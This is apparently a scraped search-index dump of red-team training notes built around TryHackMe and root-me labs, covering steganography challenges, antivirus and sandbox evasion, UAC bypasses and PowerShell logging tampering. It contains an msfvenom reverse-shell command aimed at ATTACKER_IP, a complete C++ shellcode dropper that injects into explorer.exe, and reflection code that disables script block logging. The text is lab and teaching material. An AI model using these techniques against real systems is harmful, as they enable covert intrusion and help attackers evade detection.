Host is up (0.042s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "10901307c74dd6f385bdb05be9c06854",
    "u": "https://exploitation.tymyrddin.dev/docs/notes/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Bugs are programming errors and are usually well-defined and named, in software or hardware. Vulnerabilities are bugs which can be taken advantage of to achieve an unintended or unanticipated behaviour. A Risk (Threat) may materialise, if someone decides to take advantage of a vulnerability and exploit it. An exploit is a piece of code, a program or data which takes advantage of a vulnerability to achieve an unintended or unanticipated behaviour (materializing the risk) in the software that contains a bug. A payload is the part of transmitted data that is the actual intended message to cause the unintended or unanticipated behaviour. Why?  Remote exploits are codes with purpose to exploit a vulnerability on a remote system without having any prior access to it. Local exploits are codes with purpose to exploit a vulnerability locally on the system where we already have a foothold. These exploits are almost always privilege escalation exploits with the aim to increase our privileges to a higher (preferably Administrator/Domain Admin/NT Authority\\System/root ) level to gain complete control over the resources of the target system. How?  Exploiting vulnerabilities Attack infrastructures Common shells",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8aed62ac0088069c5fb09035ea83a30e",
    "u": "https://steganography.tymyrddin.dev/",
    "t": "Steganography ",
    "c": "Steganography  The art of hiding information Notes on techniques Introduction Problems and challenges Root-me challenges Introduction EXIF metadata Dot and next line Steganomobile Twitter secret messages TXT George and Alfred WAV noise analysis Poem from space Yellow dots EXIF thumbnail WAV spectral analysis APNG just a PNG Crypt-art PDF embedded PNG LSB PNG PIT PNG PVD",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "acaf0462d946e6eeb927bf79cdd6d2ae",
    "u": "https://steganography.tymyrddin.dev/docs/root-me/png-pit",
    "t": "PNG PIT ",
    "c": "PNG PIT  root-me challenge : Find the hidden message in this image. SHA1 hash: 52062f33b7a58050c082a5f677a1ae626da32d88 . ┌──(kali㉿kali)-[~/Downloads] └─$ stegopit -v -i G ch13.png _ _ _ ___| |_ ___ __ _ ___ _ __ (_) |_ / __| __/ _ \\/ _` |/ _ \\| '_ \\| | __| \\__ \\ || __/ (_| | (_) | |_) | | |_ |___/\\__\\___|\\__, |\\___/| .__/|_|\\__| |___/ |_| 04:23:24 [DEBUG] Image size: 1000x1000 04:23:24 [DEBUG] RMS: 8296 04:23:24 [DEBUG] N other: IC=G 04:23:24 [DEBUG] Channels: GBR 04:23:24 [INFO] Hidden data: Image based steganography utilize the images as cover media to hide secret data. The common technique used in this field replaces the least significant bits (LSB) of image pixels with intended secret bits. Several improvements to enhance the security of the LSB method have been presented earlier. This paper proposed a new improved technique that takes the advantage of the 24 bits in each pixel in the RGB images using the two least significant bits of one channel to indicate existence of data in the other two channels. The stego method does not depend on a separate key to take out the key management overhead. !!! The flag for this challenge is : \"***Flag***\". Instead, it is using the size of the secret data as selection criteria for the first indicator channel to insert security randomness. Our proposed technique is analyzed using security and capacity measures and compared to two other similar work. This proposed pixel indicator technique for RGB image steganography showed interesting promising result.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2b66c9c0ffa29d1df07697e5efb6855a",
    "u": "https://steganography.tymyrddin.dev/docs/root-me/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Root-me Steganography challenges Why?  The art of hiding (and finding) information in a document. How?  EXIF Metadata Dot and next line Steganomobile Twitter secret messages TXT George and Alfred WAV noise analysis Poem from space Yellow dots EXIF Thumbnail WAV spectral analysis APNG just a PNG Crypt-art PDF embedded PNG LSB PNG PIT PNG PVD",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b8ccda6bed656bb831f369a38f156eb5",
    "u": "https://steganography.tymyrddin.dev/docs/root-me/png-pvd",
    "t": "PNG PVD ",
    "c": "PNG PVD  root-me challenge : Extract the hidden message from the image. SHA1: 06897894d602407321092489afeb84956ae2fd66 . ┌──(kali㉿kali)-[~/Downloads] └─$ stegopvd extract ch12.png -z _ _ ___| |_ ___ __ _ ___ _ ____ ____| | / __| __/ _ \\/ _` |/ _ \\| '_ \\ \\ / / _` | \\__ \\ || __/ (_| | (_) | |_) \\ V / (_| | |___/\\__\\___|\\__, |\\___/| .__/ \\_/ \\__,_| |___/ |_| 04:40:21 [INFO] Hidden data: The pixel-value differencing (PVD) scheme uses the difference value between two consecutive pixels in a block to determine how many secret bits should be embedded. There are two types of the quantization range table in Wu and Tasi's method. This is a a Steganographic Method Based on Pixel-Value Differencing and the Perfect Square Number. Flag is PvD:Pl4tiNuMvSDi4m0nd :)",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5b142c7004f1c899782fed19f8612dd0",
    "u": "https://steganography.tymyrddin.dev/docs/root-me/dots",
    "t": "Yellow dots ",
    "c": "Yellow dots  root-me challenge : You attend an interview for a forensic investigator job and they give you a challenge to solve as quickly as possible (having the Internet). They ask you to find the date of printing as well as the serial number of the printer in this document. You remain dubitative and accept the challenge.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "13613e76dd23263a75fdcd9d52d07c29",
    "u": "https://steganography.tymyrddin.dev/docs/root-me/png-lsb",
    "t": "PNG LSB ",
    "c": "PNG LSB  root-me challenge : Uncle Scrooge does not only love gold, seems he also likes secrets. Find what is hidden in the image. ┌──(kali㉿kali)-[~/Downloads] └─$ file ch9.png ch9.png: PNG image data, 225 x 225, 8-bit/color RGB, non-interlaced ┌──(kali㉿kali)-[~/Downloads] └─$ zsteg ch9.png imagedata .. file: Microsoft Works 1-3 (DOS) or 2 (Windows) document \\005\\002\\001\\370\\367\\376\\001\\003\\002\\010\\004\\377\\003\\001\\001 b3,rgb,msb,xy .. file: AIX core file fulldump 64-bit b4,b,msb,xy .. file: MPEG ADTS, layer I, v2, 24 kHz, Monaural Those are msb, not lsb. Try the analyse switch: ┌──(kali㉿kali)-[~/Downloads] └─$ zsteg -a ch9.png imagedata .. file: Microsoft Works 1-3 (DOS) or 2 (Windows) document \\005\\002\\001\\370\\367\\376\\001\\003\\002\\010\\004\\377\\003\\001\\001 b3,rgb,msb,xy .. file: AIX core file fulldump 64-bit b4,b,msb,xy .. file: MPEG ADTS, layer I, v2, 24 kHz, Monaural b5,b,lsb,xy .. file: MPEG ADTS, layer II, v1, JntStereo b5p,b,lsb,xy .. file: MPEG ADTS, layer I, v2, 24 kHz, Monaural b6,bgr,msb,xy .. file: MPEG ADTS, layer I, v2, Monaural b6p,b,lsb,xy .. file: , 32 kHz, Monaural b7,bgr,lsb,xy .. file: , 48 kHz, Monaural b7p,b,lsb,xy .. file: MPEG ADTS, layer II, v1, Monaural b8,b,msb,xy .. file: ddis/ddif b8,rgb,lsb,xy .. file: AIX core file 64-bit b8,rgb,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b1,r,lsb,xy,prime .. file: AIX core file fulldump 64-bit b6,rgb,msb,xy,prime .. file: MPEG ADTS, layer I, v2, Monaural b7,rgb,lsb,xy,prime .. file: , 48 kHz, Monaural b7p,g,lsb,xy,prime .. file: AIX core file fulldump 32-bit b8,bgr,msb,xy,prime .. file: RDI Acoustic Doppler Current Profiler (ADCP) b6,bgr,msb,yx .. file: MPEG ADTS, layer I, v2, Monaural b7,bgr,lsb,yx .. file: , 48 kHz, Monaural b8,rgb,msb,yx .. file: RDI Acoustic Doppler Current Profiler (ADCP) b1,b,lsb,XY,prime .. text: \"E|Sa?&A|\" b2,r,lsb,XY,prime .. file: AIX core file fulldump 32-bit b2,g,lsb,Xy,prime .. file: AIX core file fulldump 64-bit b1,r,lsb,xY,prime .. file: MPEG ADTS, layer II, v1, Monaural b1,b,lsb,xY,prime .. file: AIX core file fulldump b4,g,lsb,xY,prime .. file: AIX core file fulldump 64-bit b5p,g,lsb,xY,prime .. file: AIX core file fulldump 64-bit b6p,g,lsb,xY,prime .. file: AIX core file fulldump 64-bit b7p,r,lsb,xY,prime .. file: AIX core file fulldump 32-bit b7p,g,lsb,xY,prime .. file: AIX core file fulldump 64-bit Ummmm.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "3a34f646c92998babc3e2cc7e1c25022",
    "u": "https://steganography.tymyrddin.dev/docs/notes/challenges",
    "t": "Problems and challenges ",
    "c": "Problems and challenges  Secret communication is used for a variety of reasons and by a variety of people: Business people protecting company trade secrets while traveling. Criminals transmitting child pornography. Governments hiding information from their own civilians and from other governments. Techno lovers sending secret messages to each other because they can for having some fun. Terrorists sending attack plans. Activists posting information to each other. Hackers extracting and exfiltrating data from a system. Phishing by nation-state adversaries. In a world more and more on alert, the methods available to anybody who wants to hide information are bound to become more sophisticated, and will be used and misused. Civil rights and privacy?  In response to the perceived threats, legislation appeared in several countries to allow governments to look at any online communication. Some countries can send you to jail if you refuse to give up your key to encrypted data. Law enforcement works together with ISPs all the time to get information about peoples’ online activities. Using steganography for keeping personal information private jumps to mind. Securing businesses  Still too many companies and organisations seem to believe that using a single technology, such as Secure Sockets Layer (SSL) for online transactions, or network software with a firewall or VPN, is sufficient. Some may protect data in rest and then forget about protecting it in transit. What is needed today to protect from information theft, and to detect encryption and hidden data used on a local network is an all-encompassing security strategy. Which seems to not be happening too much. While businesses and organisations do not share information when they are attacked, attackers share information all the time, learning from each other’s ideas and techniques, and developing new tactics. Defense in depth and mitigating and minimizing risk is needed, but staff and budget isn’t there because management does not seem to see the value (until the cost of breach hits, and even then). Coming up  Cryptography is about encrypting messages so that they can be read only by someone who has the key. Steganography hides messages so that their very existence is undetectable. Both forms of secret communication are being used, overt and covert. Like all security technology, steganography is not perfect. If someone knows it is there and knows the algorithm that was used to hide it, and if the message is not encrypted, he or she can read it. Even if the message is encrypted, in some cases just knowing that data has been hidden in a file is enough to raise suspicions.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5680fc76dcb40d80f9adb4435ab9f628",
    "u": "https://evasion.tymyrddin.dev/",
    "t": "Nature’s cheats ",
    "c": "Nature’s cheats  Tools like nmap are very noisy and non-stealthy and can easily get picked up by devices such as firewalls and IDS. Dropping a payload on a target host, can get picked up by the Anti Virus or EDR solution. To avoid these detections, it is important to employ techniques that will bypass these defense mechanisms. Testlab Virtual machines Assemblers Compilers Disassemblers Debuggers Decompilers Exploit development Exploitation tools Process injection Introduction Shellcode injection Process hollowing Thread execution hijacking Dynamic-link library injection Portable executable injection TrickBot AV evasion Introduction Basic assembly shellcode Generate shellcode Staged vs stageless payloads Encoding and encrypting shellcode Packers Binders Obfuscation basics Introduction Principles Protecting and stripping identifiable information Signature evasion Introduction Signature identification Static code-based signatures Static property-based signatures Behavioural signatures Real world challenge Bypassing UAC Introduction GUI based bypasses AutoElevating processes Fodhelper-curver exploit Bypassing Always Notify Automated exploitation Runtime detection evasion Introduction Study AMSI PowerShell downgrade PowerShell reflection Patching AMSI Automating, but … Evading logging and monitoring Introduction Study ETW Powershell reflection Patching tracing functions Group policy takeover Abusing log pipeline Challenge Living off the land Introduction Windows sysinternals LOLBAS project File operations File execution Application whitelisting bypasses Shortcuts No PowerShell Challenge: Astaroth Network security solutions Introduction IDS/IPS systems Evasion via protocol manipulation Evasion via payload manipulation Evasion via route manipulation Evasion via tactical DoS C2 and IDS/IPS evasion Next-Generation security Firewalls Introduction Firewall systems Evasion via controlling the source MAC/IP/Port Evasion via forcing fragmentation, MTU, and data length Evasion via modifying header fields Evasion using port hopping Evasion using port tunnelling Evasion using non-standard ports Next-Generation firewalls Sandbox evasion Introduction An adversary walks into a sandbox Common sandbox evasion techniques Implementing evasion techniques The Great Escape",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "83013a9f361e3313b38584e2a98adabf",
    "u": "https://evasion.tymyrddin.dev/docs/injection/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Abusing Windows Internals What?  Process injection is an old technique used by malware. Why?  Running without a process. Placing user-mode hooks for a rootkit or formgrabber. Bypassing antivirus/firewalls by injecting whitelisted processes. How?  Shellcode injection Process hollowing Thread execution hijacking Dynamic-link library injection Portable executable injection TrickBot More attacks in MITRE T1055",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e2d4bdd7bb29efb1e04f661da1c29bff",
    "u": "https://evasion.tymyrddin.dev/docs/runtime/automation",
    "t": "Automating, but … ",
    "c": "Automating, but …  The previous methods are preferred. AMSI.fail  amsi.fail will compile and generate a PowerShell bypass from a collection of known bypasses. From amsi.fail, “AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before obfuscating. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures.” AMSITrigger  AMSITrigger allows attackers to automatically identify strings that are flagging signatures to modify and break them. This method of bypassing AMSI is more consistent than others because it makes the file itself clean. The syntax for using amsitrigger is relatively straightforward: specify the file or URL and what format to scan the file.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "817018b9c296543375d7f3ab98e13b01",
    "u": "https://evasion.tymyrddin.dev/docs/land/shortcuts",
    "t": "Shortcuts ",
    "c": "Shortcuts  Shortcuts or symbolic links are a technique used for referring to other files or applications within the OS. Once a user clicks on the shortcut file, the reference file or application is executed. Often, the Red team leverages this technique to gain initial access, privilege escalation, or persistence. The MITRE ATT&CK framework calls this “Shortcut modification” technique ( T1547 ). To use the shortcut modification technique, set the target section to execute files using: Rundll32 Powershell Regsvr32 Executable on disk",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8f03d634c0eeee1cb15a30dc7d99aa5d",
    "u": "https://evasion.tymyrddin.dev/docs/firewalls/systems",
    "t": "Firewall systems ",
    "c": "Firewall systems  Different types of firewalls are capable of inspecting packet fields. The most basic firewalls are able to inspect at least the following fields: Protocol Source Address Destination Address Depending on the protocol field, the data in the IP datagram can be one of many options. Three common protocols are TCP, UDP, and ICMP. In the case of TCP or UDP, the firewall should at least be able to check the TCP and UDP headers for Source Port number and Destination Port number. Even the most limited of firewalls should give the firewall administrator control over allowed or blocked source and destination port numbers. Classification of firewalls  There are multiple ways to classify firewalls: Whether they are independent appliances (hardware vs software). Who/what they protect (personal vs commercial). Firewall inspection abilities (red team perspective). Firewall inspection abilities  Firewalls focus on layers 3 and 4 and, to a lesser extent, layer 2. Next-generation firewalls are also designed to cover layers 5, 6, and 7. The more layers a firewall can inspect, the more sophisticated it gets and the more processing power it needs. Based on firewall abilities, we can list the following firewall types: Packet-Filtering Firewall  Packet-filtering is the most basic type of firewall. This type of firewall inspects the protocol, source and destination IP addresses, and source and destination ports in the case of TCP and UDP datagrams. It is a stateless inspection firewall. Circuit-Level Gateway  In addition to the features offered by the packet-filtering firewalls, circuit-level gateways can provide additional capabilities, such as checking TCP three-way-handshake against the firewall rules. Stateful Inspection Firewall  Compared to the previous types, this type of firewall gives an additional layer of protection as it keeps track of the established TCP sessions. As a result, it can detect and block any TCP packet outside an established TCP session. Proxy Firewall  A proxy firewall is also referred to as Application Firewall (AF) and Web Application Firewall (WAF). It is designed to masquerade as the original client and requests on its behalf. This process allows the proxy firewall to inspect the contents of the packet payload instead of being limited to the packet headers. Generally speaking, this is used for web applications and does not work for all protocols. Next-Generation Firewall (NGFW)  NGFW offers the highest firewall protection. It can practically monitor all network layers, from OSI Layer 2 to OSI Layer 7. It has application awareness and control. Examples include the Juniper SRX series and Cisco Firepower. Cloud Firewall or Firewall as a Service (FWaaS)  FWaaS replaces a hardware firewall in a cloud environment. Its features might be comparable to NGFW, depending on the service provider; however, it benefits from the scalability of cloud architecture. One example is Cloudflare Magic Firewall, which is a network-level firewall. Another example is Juniper vSRX; it has the same features as an NGFW but is deployed in the cloud. It is also worth mentioning AWS WAF for web application protection and AWS Shield for DDoS protection.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "10c6d00970317586ce090ee9b7d72d04",
    "u": "https://evasion.tymyrddin.dev/docs/firewalls/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Firewalls What?  Learn about and experiment with various firewalls. Why?  To be able to apply firewall evasion techniques, such as port hopping and port tunneling. How?  Firewall systems Evasion via controlling the source MAC/IP/Port Evasion via forcing fragmentation, MTU, and data length Evasion via modifying header fields Evasion using port hopping Evasion using port tunnelling Evasion using non-standard ports Next-Generation firewalls",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "afaa8ceb4db35a39c18ca67bf1edd03c",
    "u": "https://evasion.tymyrddin.dev/docs/uac/gui",
    "t": "GUI based bypasses ",
    "c": "GUI based bypasses  These case studies are not usually applicable to real-world scenarios, as they rely on having access to a graphical session, from where the standard UAC can be elevated. These just serve understanding. msconfig  To obtain access to a High IL command prompt without passing through UAC : On the target machine open msconfig from the start menu or the “Run” dialog. Analyse the msconfig process with Process Hacker - Even when no UAC prompt was presented, msconfig runs as a high IL process Navigate to the Tools tab of msconfig to spawn a shell inheriting the msconfig token: Launch a Command Prompt. Obtain flag C:\\> C:\\flags\\GetFlag-msconfig.exe azman.msc  azman.msc will also auto elevate without requiring user interaction, but it has no built-in way to spawn a shell: On the target machine open azman.msc from the start menu or the “Run” dialog. Analyse the process with Process Hacker - a process with high IL was spawned and all .msc files are run from mmc.exe (Microsoft Management Console). Navigate to the Help tab of Azman, an on the help screen, right-click any part of the help article and select View Source . A notepad process is spawned that can be leveraged get a shell: Go to File -> Open and make sure to select All Files in the combo box in the lower right corner. Go to C:\\Windows\\System32 and search for cmd.exe and right-click to select Open. Check the process tree in Process Hacker to see how the high integrity token is passed from mmc to cmd.exe Obtain flag C:\\> C:\\flags\\GetFlag-azman.exe",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "de5004b9423be4423fd7ca5ca30304a8",
    "u": "https://evasion.tymyrddin.dev/docs/av/shell",
    "t": "Basic assembly shellcode ",
    "c": "Basic assembly shellcode  thm.asm : global _start section .text _start: jmp MESSAGE ; 1) let's jump to MESSAGE GOBACK: mov rax, 0x1 mov rdi, 0x1 pop rsi ; 3) we are popping into `rsi`; now we have the ; address of \"THM, Rocks!\\r\\n\" mov rdx, 0xd syscall mov rax, 0x3c mov rdi, 0x0 syscall MESSAGE: call GOBACK ; 2) we are going back, since we used `call`, that means ; the return address, which is, in this case, the address ; of \"THM, Rocks!\\r\\n\", is pushed into the stack. db \"THM, Rocks!\", 0dh, 0ah Compile and link to create an x64 Linux executable file: $ nasm -f elf64 thm.asm $ ls thm.asm thm.o $ ld thm.o -o thm $ ls thm thm.asm thm.o ./thm THM, Rocks! Extract the shellcode by dumping the .text section of the compiled binary. $ objdump -d thm thm: file format elf64-x86-64 Disassembly of section .text: 0000000000401000 <_start>: 401000: eb 1e jmp 401020 <MESSAGE> 0000000000401002 <GOBACK>: 401002: b8 01 00 00 00 mov $0x1,%eax 401007: bf 01 00 00 00 mov $0x1,%edi 40100c: 5e pop %rsi 40100d: ba 0d 00 00 00 mov $0xd,%edx 401012: 0f 05 syscall 401014: b8 3c 00 00 00 mov $0x3c,%eax 401019: bf 00 00 00 00 mov $0x0,%edi 40101e: 0f 05 syscall 0000000000401020 <MESSAGE>: 401020: e8 dd ff ff ff call 401002 <GOBACK> 401025: 54 push %rsp 401026: 48 rex.W 401027: 4d 2c 20 rex.WRB sub $0x20,%al 40102a: 52 push %rdx 40102b: 6f outsl %ds:(%rsi),(%dx) 40102c: 63 6b 73 movsxd 0x73(%rbx),%ebp 40102f: 21 .byte 0x21 401030: 0d .byte 0xd 401031: 0a .byte 0xa Extract the hex value from the above output by dumping the .text section into a new file called thm.text in a binary format: $ objcopy -j .text -O binary thm thm.text $ ls thm thm.asm thm.o thm.text The thm.text file now contains the shellcode in binary format. To be able to use it, it needs to be converted to hex first. The xxd command has the -i option that will output the binary file in a C string directly: $ xxd -i thm.text unsigned char thm_text[] = { 0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff, 0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21, 0x0d, 0x0a }; unsigned int thm_text_len = 50; To confirm that the extracted shellcode works as expected, execute the shellcode and inject it into a C program: #include <stdio.h> int main(int argc, char **argv) { unsigned char message[] = { 0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff, 0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21, 0x0d, 0x0a }; (*(void(*)())message)(); return 0; } Compile and execute: $ gcc -g -Wall -z execstack thm.c -o thmx $ ./thmx THM, Rocks! Resources  Linux System Call Table for x86 64",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b8c735fad1681e7b8e73d5cbc2039170",
    "u": "https://evasion.tymyrddin.dev/docs/av/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: AV Evasion: Shellcode What?  Making shellcodes. Exploring the pros and cons of staged payloads. Creating stealthy shellcodes to avoid AV detection. Why?  Building and delivering payloads for avoiding detection by common AV engines. How?  Basic assembly shellcode Generate shellcode Staged vs stageless payloads Encoding and encrypting shellcode Packers Binders",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "758c7ef014d8939a9c5502d23d481187",
    "u": "https://evasion.tymyrddin.dev/docs/sandbox/techniques",
    "t": "Common sandbox evasion techniques ",
    "c": "Common sandbox evasion techniques  Some practical knowledge to help out in Red Team operations (from basic techniques to the most advanced): Sleeping through sandboxes Geolocation and geoblocking Checking system information Querying network information Sleeping through sandboxes  Malware Sandboxes are often limited to a time constraint to prevent the overallocation of resources, which may increase the Sandboxes queue drastically. This is a crucial aspect that can be abused. For example, if we know that a Sandbox will only run for five minutes at any given time, we can implement a sleep timer that sleeps for five minutes before executing shellcode. This could be done in any number of ways: One common way is to query the current system time and, in a parallel thread, check and see how much time has elapsed. After the five minutes have passed, the program can begin normal execution. Another popular method is to do complex, compute-heavy math, which may take a certain amount of time — for example, calculating the Fibonacci sequence up to a given number. It may take more or less time to do so based on the system’s hardware. Masking the application is generally a good idea to avoid Anti-Virus detections in general. Beware that some sandboxes may alter built-in sleep functions. Several Anti-Virus vendors have put out blog posts about bypassing built-in sleep functions. So it is highly recommended to develop our own sleep function. Geolocation and geoblocking  One defining factor of Sandboxes is that they are often located off-premise and are hosted by Anti-Virus providers. If you know you are attacking TryHackMe, a European company, and your binary is executed in California, you can make an educated guess that the binary has ended up in a Sandbox. You may choose to implement a geolocation filter on your program that checks if the IP Address block is owned by the company you are targeting or if it is from a residential address space. IfConfig.me can be used to retrieve your current IP Address, with additional information being optional. Combining this with ARIN’s RDAP allows you to determine the ISP returned in an easy to parse format (JSON). That will, ofcourse, will only work if the host has internet access. Some organizations may build a block list of specific domains, so you should be 100% sure that this method will work for the organization you are attempting to leverage this against. Checking system information.  Another incredibly popular method is to observe system information. Most Sandboxes typically have reduced resources. A popular Malware Sandbox service, Any.Run, only allocates 1 CPU core and 4GB of RAM per virtual machine. Most workstations in a network typically have 2-8 CPU cores, 8-32GB of RAM, and 256GB-1TB+ of drive space. This is incredibly dependent on the organisation that you are targeting, but generally, you can expect more than 2 CPU cores per system and more than 4GB of RAM. Knowing this, we can tailor our code to query for basic system info (CPU core count, RAM amount, Disk size, etc). Some additional examples of things to filter on: Storage Medium Serial Number PC Hostname BIOS/UEFI Version/Serial Number Windows Product Key/OS Version Network Adapter Information Virtualization Checks Current Signed in User … Querying network information  Almost no Malware Sandboxes are joined in a domain, so it’s relatively safe to assume if the machine is not joined to a domain, it is not the right target. You cannot always be too sure, so collect some information about the domain to be safe, for example. check: Computers User accounts Last User Login(s) Groups Domain Admins Enterprise Admins Domain Controllers Service Accounts DNS Servers These techniques can vary in difficulty. Consider how much time and effort to spend building out these evasion methods. A simple method, such as checking the systems environment variables (this can be done with echo %VARIABLE% or to display all variables, use the set command) for an item like the LogonServer , LogonUserSid , or LogonDomain may be much easier than implementing a Windows API. Setting the stage  Create a basic dropper that retrieves shellcode from a Web Server (specifically from /index.raw ) and injects it into memory, and executes the shellcode. All shellcode must be generated with MSFVenom in a raw format, and must be 64-bit, not 32-bit. $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f raw -o index.raw Prepare for download on the target machine: $ python3 -m http.server 8080 Download the dropper.cpp , and open it in Visual Studio Code or Codium . #include <iostream> #include <Windows.h> #include <tlhelp32.h> #include <locale> #include <string> #include <urlmon.h> #include <cstdio> #pragma comment(lib, \"urlmon.lib\") using namespace std; int downloadAndExecute() { HANDLE hProcess; //Update the dwSize variable with your shellcode size. This should be approximately 510 bytes SIZE_T dwSize = YOURSHELLCODESIZE; DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE; DWORD flProtect = PAGE_EXECUTE_READWRITE; LPVOID memAddr; SIZE_T bytesOut; //Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorer.exe-pid); //Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored. const char* c2URL = \"http://yourip/index.raw\"; IStream* stream; //Update the buff[] variable to include your shellcode size char buff[YOURSHELLCODESIZE]; unsigned long bytesRead; string s; URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0); while (true) { //Update the Read file descriptor to include your shellcode size stream->Read(buff, YOURSHELLCODESIZE, &bytesRead); if (0U == bytesRead) { break; } s.append(buff, bytesRead); } memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect); WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut); CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0); stream->Release(); return 0; } int main() { downloadAndExecute(); return 0; } There are several placeholder values on lines 16, 22, 24, 27, and 33 that must be altered to make the code function properly. Once you have entered the values, compile the code for a 64-bit release. Resources  Evasions: Timing Threading based Sleep Evasion What Is My IP Address? - ifconfig.me APNIC RDAP API",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d253df916cab46fa5d20708e2050789d",
    "u": "https://evasion.tymyrddin.dev/docs/etw/takeover",
    "t": "Group policy takeover ",
    "c": "Group policy takeover  ETW default disables some features because of the amount of logs they can create. These features can be enabled by modifying the GPO (Group Policy Object) settings of their parent policy. Two of the most popular GPO providers provide coverage over PowerShell, including script block logging and module logging. Event ID Purpose 4103 Logs command invocation 4104 Logs script block execution Script block logging will log any script blocks executed within a PowerShell session. Introduced in PowerShell v4 and improved in PowerShell v5, the ETW provider has two event IDs it will report. Event ID 4104 is important because it can expose scripts if not properly obfuscated or hidden. Module logging is a very verbose provider that will log any modules and data sent from it. Introduced in PowerShell v3, each module within a PowerShell session acts as a provider and logs its own module. Similar to the previous provider, the modules will write events to event ID 4103 . Event ID 4103 is less important because of the amount of logs created. Sysadmins limit it or disable it completely. Module logging and script block logging providers are both enabled from a group policy: Administrative Templates -> Windows Components -> Windows PowerShell. Within a PowerShell session, system assemblies are loaded in the same security context as users. This means an attacker has the same privilege level as the assemblies that cache GPO settings. Using reflection, an attacker can obtain the utility dictionary and modify the group policy for either PowerShell provider. At a high-level a group policy takeover can be broken up into three steps: Obtain group policy settings from the utility cache. Modify generic provider to 0 . Modify the invocation or module definition. Code  Use reflection to obtain the type of System.Management.Automation.Utils and identify the cachedGroupPolicySettings GPO cache field: $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static') $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null) Leverage the GPO variable to modify the event provider setting to 0. EnableScriptBlockLogging will control 4104 events, limiting the visibility of script execution. Writing to the object or registry directly: $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0 Repeat the previous step with any other provider settings. EnableScriptBlockInvocationLogging will control 4103 events, limiting the visibility of cmdlet and pipeline execution: $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0 Compile these steps together and append them to a PowerShell script.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "391840e6398f7d72ee927dedc6422fd2",
    "u": "https://evasion.tymyrddin.dev/docs/signature/property-based",
    "t": "Static property-based signatures ",
    "c": "Static property-based signatures  Signatures can be attached to several file properties, including file hash, entropy, author, name, or other identifiable information to be used individually or in conjunction. These properties are often used in rule sets such as YARA or Sigma. Some properties may be easily manipulated, while others can be more difficult, specifically when dealing with pre-compiled closed-source applications. File Hashes  A file hash, also known as a checksum, is used to tag/identify a unique file. They are commonly used to verify a file’s authenticity or its known purpose (malicious or not). File hashes are generally arbitrary to modify and are changed due to any modification to the file. With access to the source for an application, any arbitrary section of the code can be modified and re-compiled to create a new hash. When dealing with a signed or closed-source application, bit-flipping can be used. Bit-flipping is a common cryptographic attack that will mutate a given application by flipping and testing each possible bit until it finds a viable bit. By flipping one viable bit, it will change the signature and hash of the application while maintaining all functionality. A python script to create a bit-flipped list by flipping each bit and creating a new mutated variant (~3000 - 200000 variants): import sys orig = list(open(sys.argv[1], \"rb\").read()) i = 0 while i < len(orig): current = list(orig) current[i] = chr(ord(current[i]) ^ 0xde) path = 